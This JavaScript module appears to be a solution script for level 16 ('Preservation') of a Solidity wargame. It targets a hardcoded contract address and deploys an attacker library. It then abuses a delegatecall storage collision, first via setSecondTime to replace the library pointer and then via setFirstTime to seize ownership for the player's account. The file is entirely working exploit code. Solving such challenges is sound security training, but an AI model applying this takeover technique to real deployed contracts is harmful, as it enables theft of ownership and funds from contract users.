const level16 = async (web3, deployer, Preservation, PreservationTZLibrary) => {

    const targetAddress = '0x41e5aa761352de0f5099ac17d7209bb639ee8acf';
    console.log(`Exploiting Level16 target ${targetAddress}...`);

    console.log('Retrieving target contract...');
    const target = await Preservation.at(targetAddress);

    console.log('Retrieving current address...');
    const player = (await web3.eth.getAccounts())[0];

    console.log('Deploying attack library...');
    const attacker = await deployer.deploy(PreservationTZLibrary);

    console.log('Setting the attack library to timeZone1Library...');
    await target.setSecondTime(attacker.address);

    console.log('Setting the owner variable...');
    await target.setFirstTime(player);
};

module.exports = level16;